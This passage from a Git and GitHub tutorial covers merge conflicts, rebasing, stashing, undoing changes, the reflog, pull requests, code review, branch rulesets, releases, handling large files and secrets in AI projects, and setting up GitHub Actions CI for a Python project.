| `<<<<<<< HEAD` to `\|\|\|\|\|\|\|` | the version on the branch you are on (`main`), often called *ours* or *current* |
| `\|\|\|\|\|\|\|` to `=======` | the common ancestor, what the line was before either change |
| `=======` to `>>>>>>>` | the version from the branch being merged in, called *theirs* or *incoming* |

The middle block is the reason `zdiff3` is worth enabling — it supplies the missing context. Seeing that the original was `0.5` tells you *both* sides deliberately changed the value, so the question becomes which change wins, or whether a new value satisfies both. Without it you see two numbers and have to guess what happened.

### Resolving it

1. **Open the file and decide what the final code should be.** Keep one side, keep both, or write something new. Delete every marker line. Here the two authors agree on a compromise:

    ```python
    THRESHOLD = 0.65

    def score(text: str) -> float:
        return 0.0
    ```

2. **Check that nothing is left.** Search the project for `<<<<<<<`, then run the tests. A conflict resolved in the wrong way can still be valid Python, so the tests matter.
3. **Mark the file resolved by staging it, then finish the merge:**

    ```bash
    $ git add src/model.py
    $ git status
    All conflicts fixed but you are still merging.
      (use "git commit" to conclude merge)

    $ git commit             # Git pre-fills the message "Merge branch 'feature/threshold'"
    ```

*(Git 2.56+)* `git add --resolved` stages only the files that were in conflict, and refuses if any still contain conflict markers. It is a safer habit than `git add .` — which would also sweep in unrelated edits.

```bash
$ git add --resolved
fatal: the following paths still have conflict markers:
	src/model.py
```

### Resolving in an editor

Every modern editor has a conflict view. VS Code highlights each conflict with **Accept Current Change**, **Accept Incoming Change**, and **Accept Both Changes** buttons, and a **Resolve in Merge Editor** button that opens a three-way view: incoming on one side, current on the other, and the result below. For anything larger than a line or two, the three-way view beats editing markers by hand — you see all three versions at once.

### Taking one side wholesale

When you know one version of a file is simply correct, take it entirely:

```bash
$ git checkout --ours src/model.py      # keep the version from the branch you are on
$ git checkout --theirs src/model.py    # keep the version from the branch being merged in
$ git add src/model.py
```

### Lockfile conflicts

Never resolve conflicts in generated files like `uv.lock` or `package-lock.json` by hand. Resolve the conflict in the source file (`pyproject.toml`) first, then regenerate the lockfile and stage it:

```bash
$ git checkout --theirs uv.lock       # take either side as a starting point
$ uv lock                             # regenerate from the resolved pyproject.toml
$ git add pyproject.toml uv.lock
```

### Bailing out

If a conflict turns out bigger than expected, or you want to talk to the other author first, undo the whole attempt and come back later:

```bash
$ git merge --abort        # during a merge
$ git rebase --abort       # during a rebase (Section 15)
```

### Conflicts you will meet

| Message | What happened | Typical fix |
| :--- | :--- | :--- |
| `CONFLICT (content)` | both sides edited the same lines | edit the file and remove the markers |
| `CONFLICT (modify/delete)` | one side edited a file the other deleted | decide: `git add <file>` to keep it, or `git rm <file>` to delete it |
| `CONFLICT (add/add)` | both sides created a file with the same name | merge the contents or rename one |
| binary file conflict | images or model files differ | take one side wholesale with `--ours` or `--theirs` |

**Notes:**
- Prevention beats cure. Pull often, keep branches short-lived (days, not weeks), keep pull requests small, and tell teammates when you are about to reformat or move a file everyone touches.
- Run the formatter (such as `ruff format`) before committing on every branch. If one person's editor reformats a whole file, every other branch that touched it will conflict.
- `git diff` during a conflict shows only the unresolved parts, which is a quick way to see what is left.
- `git config --global rerere.enabled true` makes Git remember how you resolved a conflict and reapply it automatically if the same one comes up again, which helps on long-running branches.

---

## 15. Rebasing

Rebasing takes the commits on your branch and replays them, one at a time, on top of a different starting point. The result looks as if you had started your work from that newer point all along — a straight line instead of a fork.

```text
before:                          after "git rebase main" on feature:

    D───E          feature               D'───E'   feature
   ╱                                    ╱
  A───B───C        main          A───B───C         main
```

`D'` and `E'` contain the same changes as `D` and `E`, but they are **new commits with new hashes**, because their parent changed. That single fact — new commits, new hashes — explains every rule about rebasing.

### Updating your feature branch with the latest main

You have been working on a branch for two days, and `main` has moved on. Bring your branch up to date before opening or updating a pull request:

```bash
$ git switch feature/threshold
$ git fetch
$ git rebase origin/main
Successfully rebased and updated refs/heads/feature/threshold.
```

If a replayed commit conflicts, the rebase pauses. You resolve it exactly as in Section 14, then continue:

```bash
$ git add src/model.py
$ git rebase --continue        # moves on to the next commit
$ git rebase --abort           # or: give up and go back to how things were
```

One trap catches everyone once. **During a rebase, "ours" and "theirs" are swapped.** Git is replaying your commits onto `main`, so `HEAD` (the top block of a conflict, and `--ours`) is the *upstream* code, and the bottom block (`--theirs`) is *your* commit being replayed. The real output makes this visible in its labels:

```text
<<<<<<< HEAD
THRESHOLD = 0.6
||||||| parent of 954e47c (Raise threshold to 0.7)
THRESHOLD = 0.5
=======
THRESHOLD = 0.7
>>>>>>> 954e47c (Raise threshold to 0.7)
```

### Merge or rebase to update a branch?

Both bring the latest `main` into your branch. Teams usually pick one convention.

| | `git merge origin/main` | `git rebase origin/main` |
| :--- | :--- | :--- |
| History | keeps exactly what happened, adds a merge commit | linear, as if you started from the latest `main` |
| Rewrites commits | no | yes, your branch's commits get new hashes |
| Conflicts | resolved once, in one merge commit | may be resolved commit by commit |
| Pushing afterwards | normal `git push` | needs `git push --force-with-lease` if the branch was already pushed |
| Safe on a shared branch | yes | only if nobody else has commits on it |

### The golden rule

**Do not rebase commits that other people have based work on.** Rebasing replaces commits with new ones. If a teammate already pulled the old ones, their history and yours now disagree, and the next pull produces duplicated commits and confusing conflicts.

In practice the rule is simple: rebase freely on your *own* feature branch, and never rebase `main` or any branch several people push to.

### Force-pushing safely

After rebasing a branch you had already pushed, a normal push is rejected because GitHub's copy still has the old commits. Overwrite it, safely:

```bash
$ git push --force-with-lease
```

`--force-with-lease` only overwrites the remote branch if it still points where you last saw it. If a teammate pushed to it in the meantime, the push fails instead of destroying their work. Plain `--force` has no such check, so use `--force-with-lease` every time.

### Cleaning up commits before review

Interactive rebase lets you tidy your branch's history before others see it — squash "fix typo" commits into the work they fix, reword messages, reorder, or drop experiments.

```bash
$ git rebase -i origin/main        # every commit on your branch since main
```

Git opens a list in your editor, oldest first:

```text
pick 3f1c2a9 Add confidence threshold
pick 8d4e7b1 wip
pick c2a9f30 Fix threshold typo
pick 91b0d4e Add threshold tests
```

Change the word at the start of each line, then save and close:

| Command | Effect |
| :--- | :--- |
| `pick` | keep the commit as it is |
| `reword` | keep the changes, edit the message |
| `squash` | fold into the commit above and combine the messages |
| `fixup` | fold into the commit above and discard this message |
| `drop` | delete the commit |

A faster habit for the most common case — when you notice a mistake in an earlier commit, commit the fix as a *fixup* of that commit, and let Git arrange the squash for you.

```bash
$ git add src/model.py
$ git commit --fixup 3f1c2a9                 # creates "fixup! Add confidence threshold"
$ git rebase -i --autosquash origin/main     # the fixup is already placed and marked
```

**Notes:**
- If the team squash-merges pull requests (Section 21), branch history is collapsed into one commit on merge anyway, so polishing every commit matters less. Clean commits still make the review easier.
- `git pull` with `pull.rebase=true` is a rebase of your unpushed commits onto `origin/<branch>`, which is why it is safe — those commits were never shared.
- A rebase that went wrong is fully recoverable with the reflog (Section 18).

---

## 16. Stashing Unfinished Work

You are halfway through a change when you need to switch branches — an urgent bug, a review request, or a `git pull` that refuses to run because of local edits. You do not want to commit half-finished work. `git stash` shelves your uncommitted changes and gives you a clean working tree.

```bash
$ git stash push -m "wip: tokenizer"
Saved working directory and index state On main: wip: tokenizer

$ git switch -c fix/empty-input     # do the urgent work, commit it
$ git switch main
$ git stash pop                     # bring the shelved changes back
```

| Command | Effect |
| :--- | :--- |
| `git stash push -m "msg"` | stash tracked changes with a label |
| `git stash push -u -m "msg"` | also stash untracked files |
| `git stash list` | show all stashes, newest first as `stash@{0}` |
| `git stash pop` | reapply the newest stash and remove it from the list |
| `git stash apply stash@{1}` | reapply a specific stash and keep it in the list |
| `git stash show -p stash@{0}` | see what a stash contains |
| `git stash drop stash@{0}` | delete a stash |

**Notes:**
- A stash is for minutes or hours, not weeks. Stashes have no branch and no context, so a forgotten one is easily lost. For anything longer, commit to a branch with a `wip:` message and clean it up later.
- Plain `git stash` ignores untracked files. A brand-new file you have not added yet stays behind unless you use `-u`.
- If `git stash pop` hits a conflict, resolve it like any other, then `git stash drop` to remove the stash, since a conflicted pop keeps it in the list.

---

## 17. Undoing Changes: restore, amend, revert, reset

Most "how do I undo this?" questions have a precise answer once you know which of the three areas the mistake is in, and whether it has been pushed.

| Situation | Command | Safe after pushing? |
| :--- | :--- | :--- |
| Discard unstaged edits to a file | `git restore <file>` | n/a (local only) ⚠️ |
| Unstage a file, keep the edits | `git restore --staged <file>` | n/a |
| Fix the last commit's message or add a forgotten file | `git commit --amend` | no |
| Undo a pushed commit | `git revert <commit>` | **yes** |
| Undo the last commits but keep the changes staged | `git reset --soft HEAD~1` | no |
| Undo the last commits and unstage the changes | `git reset HEAD~1` | no |
| Throw away the last commits *and* their changes | `git reset --hard HEAD~1` | no ⚠️ |
| Delete untracked files | `git clean -n`, then `git clean -f` | n/a ⚠️ |
| Restore a file to how it was in an older commit | `git restore --source=<commit> <file>` | n/a |

⚠️ marks the commands that destroy uncommitted work, which Git cannot recover afterwards.

### restore: files

```bash
$ git restore src/model.py              # discard edits since the last commit (gone for good)
$ git restore --staged src/model.py     # unstage, keep the edits in the file
$ git restore --source=HEAD~3 src/model.py   # bring back the version from 3 commits ago
```

### amend: fix the last commit

```bash
$ git commit -m "Add notse"
$ git commit --amend -m "Add notes"            # fix the message
$ git add forgotten_file.py
$ git commit --amend --no-edit                 # add a forgotten file, keep the message
```

Amending replaces the last commit with a new one, so only amend commits you have not pushed. On your own feature branch you can amend and then `git push --force-with-lease`.

### revert: undo safely in shared history

`git revert` creates a **new commit** that applies the exact opposite of an old one. History is not rewritten — the mistake and its undoing are both recorded. That is why it is the right tool for anything already on `main` or pushed.

```bash
$ git revert 8c76d6c
[main 4713e92] Revert "Add notes"
$ git push
```

### reset: move the branch label

`git reset` moves your current branch to a different commit. The three modes differ only in what happens to the changes from the commits you moved past:

| Mode | Branch moves | Staging area | Working directory |
| :--- | :--- | :--- | :--- |
| `--soft` | yes | changes kept, staged | untouched |
| `--mixed` (default) | yes | changes kept, unstaged | untouched |
| `--hard` | yes | reset | **reset, uncommitted changes lost** |

The everyday uses:

```bash
$ git reset --soft HEAD~1     # "un-commit": redo the last commit differently
$ git reset HEAD~3            # collapse the last 3 commits back into edits, then recommit
$ git reset --hard origin/main   # make the local branch match GitHub exactly, discarding local work
```

**Notes:**
- Before any `--hard`, `git clean -f`, or `git restore <file>`, run `git status` and `git stash` anything you might want. Those three are the only common ways to truly lose work in Git.
- If you reset or amend something you had already pushed to a shared branch, do not force-push to "fix" it. Revert instead.
- Committed work you reset away is still recoverable for weeks through the reflog, described next.

---

## 18. The Reflog: Your Safety Net

Git keeps a private log, the **reflog**, of every position HEAD has been in — every commit, checkout, reset, rebase, and amend. Even when a commit no longer belongs to any branch, the reflog still points at it. By default, entries for commits that are no longer on any branch are kept for 30 days, and the rest for 90.

```bash
$ git reset --hard HEAD~2        # oops: two commits gone from the branch
HEAD is now at e858d26 Raise threshold to 0.7

$ git reflog
e858d26 HEAD@{0}: reset: moving to HEAD~2
4713e92 HEAD@{1}: revert: Revert "Add notes"
8c76d6c HEAD@{2}: commit (amend): Add notes
7b06cd1 HEAD@{3}: commit: Add notse
e858d26 HEAD@{4}: reset: moving to HEAD
e858d26 HEAD@{5}: rebase (finish): returning to refs/heads/main

$ git reset --hard HEAD@{1}      # jump back to before the mistake
HEAD is now at 4713e92 Revert "Add notes"
```

The same technique recovers a deleted branch, a rebase that went wrong, or an amend you regret. Find the line from *before* the mistake and either reset to it or create a branch there:

```bash
$ git branch rescued-work 8c76d6c        # put a branch label on a "lost" commit
```

**Notes:**
- The reflog is local and personal. It does not exist on GitHub and is not shared by clones, so it cannot rescue work that was never committed on your machine.
- `git reflog show feature/threshold` shows the history of one branch rather than HEAD.
- This is the practical reason for "commit early and often": once something is committed, the reflog can almost always bring it back.

---

## 19. Pull Requests from Start to Finish

A **pull request** (PR) is a GitHub page proposing that one branch be merged into another. It shows the diff, collects review comments, runs automated checks, and records the discussion permanently next to the code. In almost every team, nothing reaches `main` except through a pull request — not even a one-line fix.

### Opening one

```bash
$ git switch -c feature/threshold
# ... edit, commit, commit ...
$ git push
$ gh pr create --fill                 # title and body from your commits
$ gh pr create --draft --title "Add confidence threshold" --body "Closes #12"
```

Or on the website: after a push, GitHub shows a yellow **Compare & pull request** banner on the repository page. Click it, check that **base** is `main` and **compare** is your branch, write the description, and click **Create pull request**.

### Writing a description reviewers can act on

````markdown
## What
Adds a confidence threshold to `score()`. Results below it are reported
as "neutral".

## Why
Low-confidence predictions were being forced into positive or negative,
which users reported as wrong. Closes #12.

## How to test
```bash
uv run pytest tests/test_model.py
curl -X POST localhost:8000/score -d '{"text": "fine I guess"}'
```

## Notes
Threshold defaults to 0.6; open to suggestions on the value.
````

`Closes #12` (or `Fixes #12`, `Resolves #12`) links the issue and closes it automatically when the PR merges into the default branch.

### The review loop

1. Reviewers comment, approve, or request changes (Section 20).
2. You address feedback with **new commits on the same branch** and push. The PR updates itself; there is no need to open a new one.
3. CI runs again on every push, and its result shows at the bottom of the PR (Section 26).
4. Reply to each comment, or resolve the thread, so reviewers can see what was handled.

### Keeping the PR current

If `main` moves on while your PR is open and GitHub reports **This branch has conflicts that must be resolved**, update your branch locally with either method from Section 15, then push:

```bash
$ git fetch
$ git rebase origin/main          # or: git merge origin/main
# resolve any conflicts, run the tests
$ git push --force-with-lease     # plain "git push" if you merged
```

GitHub's **Update branch** button does the same for simple cases without conflicts.

### Merging and cleaning up

Once approved and green, merge with the button on the PR (or `gh pr merge --squash --delete-branch`). Then tidy up locally:

```bash
$ git switch main
$ git pull
$ git branch -d feature/threshold
```

If the PR was squash-merged, `git branch -d` may say the branch is "not fully merged", because the squashed commit on `main` has a different hash from your branch's commits. Once you have confirmed the PR merged on GitHub, `git branch -D` is safe.

### Draft PRs and the CLI

Open a **draft** pull request early when you want feedback on direction or want CI to run, but the work is not ready to merge. Mark it **Ready for review** when it is. A few `gh` commands cover most of the PR workflow from the terminal:

| Task | Command |
| :--- | :--- |
| List open PRs | `gh pr list` |
| Check out a teammate's PR locally | `gh pr checkout 42` |
| View a PR and its checks | `gh pr view 42`, `gh pr checks 42` |
| Request a reviewer | `gh pr edit 42 --add-reviewer octo-reviewer` |
| Merge automatically once checks pass (auto-merge must be enabled in the repository settings) | `gh pr merge 42 --squash --delete-branch --auto` |

**Notes:**
- Small PRs get reviewed faster and better. Under about 400 changed lines is a good target, so split large features into a sequence of PRs.
- Review your own diff on GitHub before requesting review. Stray debug prints and commented-out code are much easier to spot there than in the editor.
- A PR from a **fork** works the same way, except the branch lives in your copy of the repository (Section 21).

---

## 20. Reviewing Code

Code review is half of the pull request workflow, and as a reviewer you are checking more than style. The main questions are whether the change is correct, whether it is understandable, and whether it is safe to run in production.

On the PR's **Files changed** tab, click the **+** beside any line to comment, or drag across several lines. Comments are collected into a review and published together when you submit with one of three outcomes:

| Outcome | Meaning |
| :--- | :--- |
| **Comment** | general feedback, neither blocking nor approving |
| **Approve** | ready to merge from your point of view |
| **Request changes** | must be addressed before merging |

A **suggestion block** lets you propose an exact edit that the author can apply with one click:

````markdown
```suggestion
THRESHOLD = float(os.getenv("SCORE_THRESHOLD", "0.6"))
```
````

### What to look for

- **Correctness:** edge cases, error handling, empty input, off-by-one mistakes. Are there tests, and do they test the behaviour rather than the implementation?
- **Clarity:** could someone new understand it in six months? Names, structure, and comments that explain *why*.
- **Safety:** secrets in code, user input reaching shell commands or SQL, new dependencies, and for AI code, prompts that include untrusted text or model output used without validation.
- **Scope:** does the PR do one thing? Unrelated changes belong in their own PR.

### Giving and receiving feedback

Comment on the code, not the person, and explain the reasoning ("this will query the database once per row; batching would avoid that"). Label minor points as optional, for example with a `nit:` prefix, so the author knows what is blocking. As an author, treat review as collaboration rather than judgement — ask when a comment is unclear, and push back with reasons when you disagree.

**Notes:**
- Pull the branch and run it locally for anything non-trivial: `gh pr checkout 42`, then run the tests.
- Review promptly. A PR waiting two days for review blocks its author and goes stale against `main`.
- AI review tools, including GitHub's own Copilot code review, can catch routine issues before a human looks. They complement human review rather than replacing it.

---

## 21. Team Workflows and Branch Rules

### GitHub flow

Most teams, from small startups to large companies, use some form of **GitHub flow**:

1. `main` is always deployable.
2. All work happens on short-lived branches created from `main`.
3. Changes reach `main` only through a reviewed pull request with passing checks.
4. Merged work is deployed, often automatically.
5. The branch is deleted after merging.

You may read about **Git Flow**, an older model with long-lived `develop` and `release/*` branches. It still exists in some organisations shipping versioned software, but for web services and AI applications, GitHub flow or trunk-based development (very short branches merged at least daily) is the norm.

### Collaborators or forks

| Model | Who uses it | How it works |
| :--- | :--- | :--- |
| **Shared repository** | teams and companies | everyone is a collaborator, pushes branches to the same repository, and opens PRs within it |
| **Fork and pull request** | open source | contributors copy the repository into their own account (a fork), push there, and open a PR back to the original |

Contributing to an open-source project:

```bash
$ gh repo fork someorg/somelib --clone       # forks, clones, and adds the original as "upstream"
$ cd somelib
$ git switch -c fix/typo-in-docs
# ... commit ...
$ git push                                   # to your fork
$ gh pr create                               # opens a PR against the original repository
```

To keep a fork current: `git fetch upstream`, then `git rebase upstream/main` (or click **Sync fork** on GitHub).

### Protecting main with rulesets

Branch rules stop anyone — including administrators, if you choose — from pushing directly to `main` or merging without review and green checks. GitHub's current mechanism is **rulesets**, under **Settings → Rules → Rulesets → New branch ruleset**. The older **branch protection rules** still work, and both can coexist, but rulesets are more flexible — several can apply at once, they can be switched off without being deleted, and anyone with read access can see them.

A sensible ruleset for `main`:

| Rule | Why |
| :--- | :--- |
| Target: the default branch | applies to `main` |
| Require a pull request before merging, with 1 approval | no unreviewed code on `main` |
| Require status checks to pass, selecting your CI job | nothing merges with failing tests (Section 26) |
| Block force pushes | history on `main` can never be rewritten |
| Restrict deletions | `main` cannot be deleted by accident |

Rulesets are free on public repositories. Private repositories need a paid plan (Pro, Team, or Enterprise) for enforcement.

### Merge methods

The merge button offers three methods, and teams usually allow only one, set under **Settings → General → Pull Requests**.

| Method | Result on `main` | Trade-off |
| :--- | :--- | :--- |
| **Create a merge commit** | all branch commits plus a merge commit | complete history, but noisy |
| **Squash and merge** | one commit per PR | clean, one commit per feature; individual branch commits are condensed |
| **Rebase and merge** | branch commits replayed onto `main`, no merge commit | linear, but every branch commit must be good enough for `main` |

Squash and merge is the most common choice for application teams, because history on `main` then reads as one line per pull request, and reverting a feature means reverting one commit.

### CODEOWNERS and templates

A few files in a `.github/` folder at the repository root automate team conventions:

```text
.github/
├── CODEOWNERS                  # who is auto-requested to review which paths
├── pull_request_template.md    # pre-fills every new PR description
├── ISSUE_TEMPLATE/             # structured forms for bug reports and feature requests
├── dependabot.yml              # dependency updates (Section 29)
└── workflows/                  # GitHub Actions (Sections 24 to 28)
```

```text
# .github/CODEOWNERS: the last matching pattern wins
*               @octocat
/src/models/    @octocat @ml-reviewer
/.github/       @octocat
```

**Notes:**
- Turn on **Automatically delete head branches** under **Settings → General**, so merged branches disappear from GitHub on their own.
- Requiring review from code owners (an option in the ruleset) makes CODEOWNERS binding rather than advisory.

---

## 22. Issues, Tags, and Releases

### Issues

An **issue** tracks one piece of work: a bug, a feature request, or a question. Each gets a number, and that number links everything together. Mention `#12` in a commit message, PR, or comment and GitHub cross-links it automatically. **Labels** (`bug`, `enhancement`, `good first issue`), **assignees**, and **milestones** organise them, and **GitHub Projects** gives a board or table view across issues for planning.

```bash
$ gh issue create --title "Empty input crashes score()" --label bug
$ gh issue list --assignee @me
$ gh issue develop 12 --checkout      # create and check out a branch linked to issue 12
```

A good bug report contains what you did, what you expected, what actually happened, and the environment (OS, Python version, package version). That same structure makes a good issue template.

### Tags

A **tag** is a permanent, named label on a specific commit, typically marking a release. Unlike a branch, it does not move.

```bash
$ git tag -a v1.0.0 -m "First stable release"   # annotated tag on the current commit
$ git push origin v1.0.0                        # tags are not pushed by default
$ git tag                                       # list tags
$ git switch --detach v1.0.0                    # inspect the code exactly as released
```

Version numbers usually follow **semantic versioning**, `MAJOR.MINOR.PATCH`:

| Part | Increase when | Example |
| :--- | :--- | :--- |
| MAJOR | you make a breaking change | `1.4.2` to `2.0.0` |
| MINOR | you add backwards-compatible features | `1.4.2` to `1.5.0` |
| PATCH | you make backwards-compatible fixes | `1.4.2` to `1.4.3` |

### Releases

A GitHub **release** is a tag plus notes and optional downloadable files, shown on the repository's **Releases** page.

```bash
$ gh release create v1.0.0 --generate-notes      # notes built from merged PRs since the last release
$ gh release create v1.1.0 dist/*.whl --title "v1.1.0" --notes "Adds batch scoring"
```

**Notes:**
- Use annotated tags (`-a`) for releases. They record who tagged, when, and why. Lightweight tags (`git tag v1.0.0` with no `-a`) are only a name.
- Never move or delete a tag that has been pushed and used. Make a new version instead — other people and systems may already depend on the old one.
- Section 28 automates releases, so pushing a tag builds and publishes everything.

---

## 23. Large Files, Datasets, Notebooks, and Secrets

Data science and AI projects strain Git in ways ordinary software does not. Git is designed for text files that change a few lines at a time, and it keeps every version of every file forever. A 2 GB model checkpoint committed once stays in history even after you delete it, and every clone downloads it.

### Size limits

GitHub warns when you push a file over 50 MiB and blocks files over 100 MiB. Long before those limits, large binaries make a repository slow to clone and expensive to store.

| Artefact | Where it belongs |
| :--- | :--- |
| Code, configs, small sample data (a few MB) | Git |
| Datasets | object storage (S3, GCS, Azure Blob), Hugging Face Hub datasets, or a data versioning tool such as [DVC](https://dvc.org/) |
| Model weights and checkpoints | a model registry, Hugging Face Hub, object storage, or Git LFS for moderate sizes |
| Experiment runs, logs, metrics | an experiment tracker such as MLflow or Weights & Biases, never Git |

### Git LFS

**Git Large File Storage** replaces large files in the repository with small pointer files and stores the real content on a separate server. Clones fetch the actual files on demand.

```bash
$ git lfs install                      # once per machine
$ git lfs track "*.onnx"               # writes the pattern to .gitattributes
$ git add .gitattributes model.onnx
$ git commit -m "Add exported model via LFS"
```

LFS has storage and bandwidth quotas on GitHub, so it suits files of tens to hundreds of megabytes that change rarely. It is not a substitute for proper dataset storage.

### Jupyter notebooks

A notebook is a JSON file that embeds every output, including images and long tables. That makes diffs unreadable and inflates the repository on every run.

- Clear outputs before committing (**Clear All Outputs** in Jupyter or VS Code), or install [nbstripout](https://github.com/kynan/nbstripout), which does it automatically on each commit: `nbstripout --install`.
- For readable diffs and merges, [nbdime](https://nbdime.readthedocs.io/) gives notebook-aware `git diff` and conflict resolution. GitHub's PR view also renders notebook diffs.
- Move reusable code out of notebooks into `.py` modules and import it. Code in modules is easier to review, test, and merge.

### Secrets and API keys

AI applications run on API keys, and leaked keys get abused within minutes of being pushed to a public repository — automated scanners watch GitHub constantly.

1. Keep keys in a `.env` file that is listed in `.gitignore`, and load them with `python-dotenv` or `pydantic-settings`.
2. Commit a `.env.example` with variable names and placeholder values.
3. In CI, use GitHub Actions secrets (Section 27), never values in workflow files.
4. GitHub's **push protection** blocks pushes containing recognisable secrets on public repositories. Treat it as a last line of defence, not a plan.

**If a secret is committed anyway, revoke it first.** Generate a new key with the provider and disable the old one before doing anything else. Deleting the file, amending, or even rewriting history does not undo the exposure, because the key may already have been copied from GitHub, a fork, or someone's clone. Cleaning history afterwards, with a tool such as `git filter-repo`, is tidying up — not the fix.

**Notes:**
- Check `git status` and the staged diff before committing in data projects especially. A new `data/` folder or a notebook full of outputs is the most common accident.
- Keep small, anonymised sample data in the repository (`tests/fixtures/` or `data/sample/`) so tests and newcomers can run the code without the full dataset.

---

## 24. How GitHub Actions Works

**GitHub Actions** runs commands for you on GitHub's machines whenever something happens in a repository — a push, a pull request, a tag, a schedule, or a button press. The two main uses are **continuous integration (CI)**, which automatically tests every change before it can merge, and **continuous deployment (CD)**, which automatically ships every change that lands on `main`.

The value is consistency. CI runs the same checks, on a clean machine, for every change by every person — so "it works on my machine" stops being an argument, and broken code is caught at the pull request instead of in production.

### The vocabulary

| Term | Meaning |
| :--- | :--- |
| **Workflow** | an automated process, defined in a YAML file in `.github/workflows/` |
| **Event** | what triggers a workflow: `push`, `pull_request`, `schedule`, `workflow_dispatch`, and others |
| **Job** | a group of steps that runs on one fresh machine. Jobs in a workflow run in parallel unless one `needs` another |
| **Step** | one command (`run:`) or one reusable action (`uses:`) inside a job |
| **Action** | a packaged, reusable step, such as `actions/checkout` to fetch your code |
| **Runner** | the virtual machine a job runs on: `ubuntu-latest`, `windows-latest`, or `macos-latest` |
| **Secret** | an encrypted value, such as an API key, made available to workflows |

```text
event (push to a PR)
  └── workflow: CI  (.github/workflows/ci.yml)
        ├── job: lint     ── runner ── step, step, step
        └── job: test     ── runner ── step, step, step
```

Every job starts on a brand-new machine with nothing on it except the runner's preinstalled tools. That is why each job begins by checking out the code and installing dependencies, and why nothing carries over between jobs unless you pass it explicitly as an artifact.

### Common triggers

```yaml
on:
  push:
    branches: [main]          # every push to main
  pull_request:               # every PR, and every new push to an open PR
  workflow_dispatch:          # a "Run workflow" button on the Actions tab
  schedule:
    - cron: "0 3 * * *"       # every day at 03:00 UTC
  release:
    types: [published]        # when a release is published
```

### Watching runs

Every run appears on the repository's **Actions** tab, with live logs for each step, and on the pull request it ran for. From the terminal:

```bash
$ gh run list                 # recent runs and their status
$ gh run watch                # follow the current run live
$ gh run view --log-failed    # print only the logs of the failed steps
$ gh run rerun --failed       # retry only the jobs that failed
```

**Notes:**
- Actions is free for public repositories. Private repositories get a monthly allowance of free minutes on every plan, after which usage is billed.
- Workflow files are code. They are reviewed in pull requests and versioned like everything else, which is a large part of why CI as configuration works so well.

---

## 25. Your First CI Workflow for a Python Project

This workflow lints, checks formatting, and tests a uv-managed project on every push to `main` and on every pull request. It assumes the project has `ruff` and `pytest` as development dependencies, added with `uv add --dev ruff pytest`.

Create `.github/workflows/ci.yml`:

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Check out the code
        uses: actions/checkout@v7
        with:
          persist-credentials: false

      - name: Install uv
        uses: astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2 # v10.3.3

      - name: Install dependencies
        run: uv sync --locked

      - name: Lint
        run: uv run ruff check .

      - name: Check formatting
        run: uv run ruff format --check .

      - name: Run tests
        run: uv run pytest
```

Commit it, push, and open the **Actions** tab to watch it run.

### What each part does

| Part | Purpose |
| :--- | :--- |
| `on:` | run on pushes to `main` and on every pull request |
| `permissions: contents: read` | the workflow's token may only read the repository, the least privilege it needs (Section 27) |
| `concurrency:` | if you push again while a run for the same branch is in progress, cancel the old run instead of wasting minutes on it |
| `runs-on: ubuntu-latest` | a fresh Linux virtual machine for this job |
| `actions/checkout` | clones your repository onto the runner. `persist-credentials: false` stops the Git token lingering on the machine when later steps do not need to push |
| `astral-sh/setup-uv` | installs uv, and on GitHub's runners caches downloaded packages between runs by default, so later runs install in seconds. It skips the cache for tag and release runs on purpose, so a tampered cache can never leak into a release |
| `uv sync --locked` | installs exactly what `uv.lock` specifies, and **fails if the lockfile is out of date** with `pyproject.toml`, catching a forgotten `uv lock` |
| `ruff check`, `ruff format --check`, `pytest` | the checks themselves. Any command that exits with a non-zero code fails the step, which fails the job |

uv picks the Python version from the project's `.python-version` file, so CI and your machine use the same interpreter without any extra configuration.

### Testing several Python versions

A **matrix** runs the same job once per combination of values, in parallel. Libraries use one to prove compatibility; applications usually test only the version they deploy on.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        python-version: ["3.12", "3.13", "3.14"]
    steps:
      - uses: actions/checkout@v7
        with:
          persist-credentials: false
      - uses: astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2 # v10.3.3
        with:
          python-version: ${{ matrix.python-version }}
      - run: uv sync --locked
      - run: uv run pytest
```

`fail-fast: false` lets every version finish, so one failure does not hide the others.

### Projects using pip instead of uv

```yaml
steps:
  - uses: actions/checkout@v7
    with:
      persist-credentials: false
  - uses: actions/setup-python@v7
    with:
      python-version: "3.13"
      cache: pip
  - run: pip install -r requirements.txt -r requirements-dev.txt
  - run: pytest
```

### A status badge

Add this line to `README.md` to show the CI status of `main` on the repository page:

```markdown
![CI](https://github.com/octocat/sentiment-api/actions/workflows/ci.yml/badge.svg)
```

### Testing AI code in CI

Calls to a hosted LLM are slow, cost money, and give different answers from run to run, which makes them poor material for checks that run on every push. Keep the CI suite fast and deterministic:

- **Mock the model client in unit tests**, so tests check *your* logic (prompt construction, parsing, retries, tool handling) against fixed responses.
- **Run real-model evaluations separately**, on a schedule or a manual trigger, where cost and variance are acceptable:

```yaml
name: Nightly LLM evals

on:
  schedule:
    - cron: "0 3 * * *"
  workflow_dispatch:

permissions:
  contents: read

jobs:
  evals:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          persist-credentials: false
      - uses: astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2 # v10.3.3
      - run: uv sync --locked
      - name: Run evals against the real model API
        env:
          LLM_API_KEY: ${{ secrets.LLM_API_KEY }}
        run: uv run pytest tests/evals -m evals
```

**Notes:**
- Run the same commands locally before pushing: `uv run ruff check . && uv run ruff format --check . && uv run pytest`. CI should confirm what you already know — not be the first place you find out.
- YAML is whitespace-sensitive. Indent with spaces, never tabs, and keep list items aligned. A linter such as [actionlint](https://github.com/rhysd/actionlint) catches most workflow mistakes before you push.
- Version numbers for actions (`@v7`, `v10.3.3`) change over time. Dependabot keeps them current automatically (Section 29).

---

## 26. Making CI a Gate: Required Checks

A workflow that runs but can be ignored only informs. The value comes from making it **required**, so a pull request cannot merge until the checks pass.

1. Let the workflow run at least once, so GitHub knows the check's name. The check is named after the **job**: `test` in the workflow above, which pull requests list as `CI / test (pull_request)`.
2. Open **Settings → Rules → Rulesets**, then edit the ruleset for `main` (Section 21), or create one.
3. Enable **Require status checks to pass**, click **Add checks**, and select `test`.
